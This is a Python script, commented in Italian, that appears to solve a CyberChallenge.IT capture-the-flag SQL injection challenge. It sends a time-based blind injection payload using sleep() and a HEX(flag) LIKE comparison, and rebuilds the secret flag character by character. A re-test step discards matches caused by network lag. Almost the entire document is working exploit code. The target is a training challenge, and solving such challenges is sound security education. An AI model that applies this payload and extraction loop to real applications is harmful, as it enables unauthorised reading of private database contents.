import requests
import time

# ==============================================================================
# CLASSE INJ
# ==============================================================================
class Inj:
    def __init__(self, host):
        self.sess = requests.Session()
        self.base_url = f'{host.rstrip("/")}/api/'
        self._refresh_csrf_token()

    def _refresh_csrf_token(self):
        resp = self.sess.get(self.base_url + 'get_token').json()
        self.token = resp['token']

    def _do_raw_req(self, url, query):
        headers = {'X-CSRFToken': self.token}
        data = {'query': query }
        return self.sess.post(url, json=data, headers=headers, timeout=5).json()

    def time(self, query):
        url = self.base_url + 'time'
        try:
            self._do_raw_req(url, query)
        except requests.exceptions.ReadTimeout:
            pass

# ==============================================================================
# SCRIPT TIME-BASED (CON DOUBLE-CHECK ANTI-LAG)
# ==============================================================================

host = 'http://sqlinjection.challs.cyberchallenge.it'
print(f"[*] Connessione a {host} in corso...")
try:
    inj = Inj(host)
except Exception as e:
    print(f"[-] Errore di rete all'avvio: {e}")
    exit(1)

dictionary = '0123456789abcdef'

# === BACKTRACKING ===
# Abbiamo rimosso il "50" (la P) perché era un falso positivo causato dal lag.
# Ripartiamo dalla certezza assoluta: "CCIT{Dont"
result = '434349547b446f6e74'

payload = "1' and (select sleep(1) from flags where HEX(flag) LIKE '{}%')='1"

print("[*] Avvio attacco con VERIFICA ANTI-FALSI POSITIVI...")
print(f"[*] Partiamo da: {result} (CCIT{{Dont)")

while True:
    trovato = False
    for c in dictionary:
        question = payload.format(result + c)
        
        print(f"[*] Test: {result + c} | ", end='', flush=True)
        
        start = time.time()
        inj.time(question)
        elapsed = time.time() - start
        
        print(f"Tempo: {elapsed:.2f}s", end='\r')
        
        # Se scatta il timer, NON ci fidiamo subito. Facciamo la contro-prova!
        if elapsed > 0.95: 
            print(f"\n[?] Sospetto match su '{c}'. Verifica in corso per evitare il lag...", end='\r')
            
            # Pausa e secondo tentativo
            time.sleep(0.2)
            start_verify = time.time()
            inj.time(question)
            elapsed_verify = time.time() - start_verify
            
            # Se supera di nuovo 0.95, allora è vero al 100%!
            if elapsed_verify > 0.95:
                result += c
                print(f"\n[+] CONFERMATO: '{c}' -> HEX: {result} (Tempi: {elapsed:.2f}s, {elapsed_verify:.2f}s)")
                trovato = True
                break
            else:
                # Era solo lag! Lo scartiamo e continuiamo a cercare.
                print(f"\n[-] Falso Positivo scartato su '{c}' (Test2: {elapsed_verify:.2f}s). Riprendo...")
                
        time.sleep(0.1)
            
    if not trovato:
        print("\n\n[-] Nessun match trovato. Estrazione finita o errore a monte.")
        break

print(f"\n[*] Estrazione Hex terminata: {result}")

# Conversione Finale
if result:
    try:
        flag = bytes.fromhex(result).decode('utf-8')
        print("="*50)
        print(f"[!] FLAG DECIFRATA: {flag}")
        print("="*50)
    except Exception as e:
        print(f"[-] Errore nella conversione ASCII: {e}")